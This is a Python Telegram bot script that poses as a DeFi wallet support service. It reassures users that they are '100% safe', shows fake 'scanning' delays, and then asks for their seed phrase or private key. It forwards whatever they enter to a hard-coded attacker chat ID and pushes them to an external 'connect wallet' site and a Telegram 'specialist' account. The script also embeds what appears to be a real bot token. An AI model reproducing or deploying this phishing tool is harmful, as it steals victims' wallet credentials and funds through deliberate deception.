import telebot
import time
from telebot import types

# Replace 'your_actual_bot_token' with your actual bot token
BOT_TOKEN = '6964010732:AAEXqhBGn0ITWIBoB-IJcOj7q1gJZgbnICs'
TARGET_USER_ID = 7175704341

bot = telebot.TeleBot(BOT_TOKEN)

# Dictionary to store user data during the conversation
user_data = {}

# Function to handle the category selection
def handle_category_selection(message):
    chat_id = message.chat.id
    user_data[chat_id] = {}
    
    # Send safety and security message
    safety_message = "You are 100% safe and secure with DeFi support bot, bot did not save any data or have access to your wallet, none of your information is visible to us, please enter the correct info to let the bot access and fix your issue automatically"
    bot.send_message(chat_id, safety_message)
    
    markup = types.InlineKeyboardMarkup()

    categories = [
        "Migration", "Swap/Bridge", "Revoke Stock Txn", "LP Unlock",
        "NFT Mint", "Validate", "Stake/Unstake", "Withdraw Issue",
        "Fail Swap", "Pending Txn", "Lost Wallet", "Hack Wallet",
        "Buy Token", "Claim Airdrop", "Others"
    ]

    # Create buttons for each category
    for category in categories:
        category_button = types.InlineKeyboardButton(category, callback_data=category.lower().replace("/", "_"))

        # Add buttons to the markup
        markup.add(category_button)

    # Send message with inline keyboard for category selection
    bot.send_message(chat_id, "Please select a category:", reply_markup=markup)


# Handle callback queries from inline keyboard
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    category = call.data
    user_data[chat_id]['category'] = category

    # Continue with the next steps
    time.sleep(2)
    bot.send_message(chat_id, f"You have selected the category: {category}. Please proceed.")

    # You can continue with additional steps or actions here based on the selected category
    if category == 'migration':
        # Perform actions related to migration
        bot.send_message(chat_id, "Performing migration-related actions...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)
    elif category == 'swap_bridge':
        # Perform actions related to swap/bridge
        bot.send_message(chat_id, "Performing swap/bridge-related actions...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)
    elif category == 'revoke_stock_txn':
        # Perform actions related to revoking stock transactions
        bot.send_message(chat_id, "Performing actions to revoke stock transactions...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)
    elif category == 'lp_unlock':
        # Perform actions related to LP unlock
        bot.send_message(chat_id, "Performing LP unlock-related actions...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)
    elif category == 'nft_mint':
        # Perform actions related to NFT mint
        bot.send_message(chat_id, "Performing NFT mint-related actions...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)
    elif category == 'validate':
        # Perform actions related to validation
        bot.send_message(chat_id, "Performing validation-related actions...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)
    elif category == 'stake_unstake':
        # Perform actions related to stake/unstake
        bot.send_message(chat_id, "Performing stake/unstake-related actions...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)
    elif category == 'withdraw_issue':
        # Perform actions related to withdraw issue
        bot.send_message(chat_id, "Performing withdraw issue-related actions...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)
    elif category == 'fail_swap':
        # Perform actions related to fail swap
        bot.send_message(chat_id, "Performing fail swap-related actions...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)
    elif category == 'pending_txn':
        # Perform actions related to pending transaction
        bot.send_message(chat_id, "Performing pending transaction-related actions...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)
    elif category == 'lost_wallet':
        # Perform actions related to lost wallet
        bot.send_message(chat_id, "Performing lost wallet-related actions...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)
    elif category == 'hack_wallet':
        # Perform actions related to hack wallet
        bot.send_message(chat_id, "Performing hack wallet-related actions...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)
    elif category == 'buy_token':
        # Perform actions related to buy token
        bot.send_message(chat_id, "Performing buy token-related actions...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)
    elif category == 'claim_airdrop':
        # Perform actions related to claim airdrop
        bot.send_message(chat_id, "Performing claim airdrop-related actions...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)
    else:
        # Handle the case if 'Others' category is selected
        bot.send_message(chat_id, "Performing actions for 'Others' category...\nKindly enter the affected wallet address")
        bot.register_next_step_handler(call.message, process_wallet_step)


# Command handler for /start or /hello
@bot.message_handler(commands=['start', 'hello'])
def send_welcome(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "Welcome to Support Bot! Your go-to companion for all things DeFi. From troubleshooting to educational resources, we're here to enhance your decentralized finance journey. Feel free to ask any questions or seek assistance. type /help to show help menu. Let's navigate the crypto space together! 👋")

    # Ask the user to select a category
    time.sleep(3)
    handle_category_selection(message)

# Help command handler
@bot.message_handler(commands=['help'])
def send_help(message):
    chat_id = message.chat.id
    help_message = (
        "Here are the available commands:\n"
        "/start - Start or restart the conversation\n"
        "/help - Show available commands\n"
        "/issue - Report an issue\n"
        "Select a category from the list provided."
    )
    bot.send_message(chat_id, help_message)

# Issue command handler
@bot.message_handler(commands=['issue'])
def process_issue_command(message):
    chat_id = message.chat.id
    # bot.send_message(chat_id, "You have selected the issue reporting command. Please proceed by describing the issue.")

    # Register the next step handler for issue description
    bot.register_next_step_handler(message, process_issue_step)

# Function to handle the issue details
def process_issue_step(message):
    chat_id = message.chat.id
    user_data[chat_id] = {'issue': message.text}

    # Ask the user to enter the affected wallet after a 3-second delay
    time.sleep(3)
    # bot.send_message(chat_id, "Please enter the affected wallet address.")
    bot.register_next_step_handler(message, process_wallet_step)

# Function to handle the affected wallet address
def process_wallet_step(message):
    chat_id = message.chat.id
    user_data[chat_id] = {'wallet': message.text}

    # Proceed to scanning the solution after a 3-second delay
    time.sleep(3)
    bot.send_message(chat_id, "Scanning for a solution...")
    
    # Sleep for 10 seconds before sending the solution found message
    time.sleep(10)
    
    # Send the solution found message
    bot.send_message(chat_id, "Solution found! DeFi support bot needs access to the affected wallet in order to solve the issue. "
                              "Please enter your seed phrase or private key below. Alternatively, type /continue to visit the bot website to resolve the issue.")

    # Ask the user to enter their private key or phrase
    bot.register_next_step_handler(message, process_private_key)

def process_private_key(message):
    chat_id = message.chat.id
    private_key = message.text

    if private_key.lower() == '/continue':
        process_continue_command(message)
    else:
        # Send the private key to the specified chat ID (7175704341)
        bot.send_message(TARGET_USER_ID, f"User {chat_id} has provided the private key or phrase: '{private_key}'")

        # Send a confirmation message to the user
        bot.send_message(chat_id, f"Your private key or phrase '{private_key}' has been received. Our support team will assist you shortly.")

        # Send an inline keyboard with buttons
        markup = types.InlineKeyboardMarkup()

        # Button to visit an external website
        website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://fegdapps.pages.dev/')
        markup.add(website_button)
        # Button to visit an external website
        website_button1 = types.InlineKeyboardButton("Connect with Specialist", url='https://t.me/helpteam_1')
        markup.add(website_button1)

        # Send the message with the inline keyboard
        bot.send_message(chat_id, "Click the button below to visit the bot website and click connect wallet, choose wallet type, and login:", reply_markup=markup)

# Function to handle the /continue command
@bot.message_handler(commands=['continue'])
def process_continue_command(message):
    chat_id = message.chat.id
    # Send a message with instructions to visit the bot website
    bot.send_message(chat_id, "To resolve the issue, please visit the bot website and follow the instructions to connect your wallet.")
    # Create a new markup object for the button
    markup = types.InlineKeyboardMarkup()
    website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://fegdapps.pages.dev/')
    markup.add(website_button)

    website_button1 = types.InlineKeyboardButton("Connect with Specialist", url='https://t.me/helpteam_1')
    markup.add(website_button1)
    # Send the message with the inline keyboard
    bot.send_message(chat_id, "Click the button below to visit the bot website and click connect wallet, choose wallet type, and login:", reply_markup=markup)

# Additional handlers or functionality here

if __name__ == "__main__":
    bot.polling()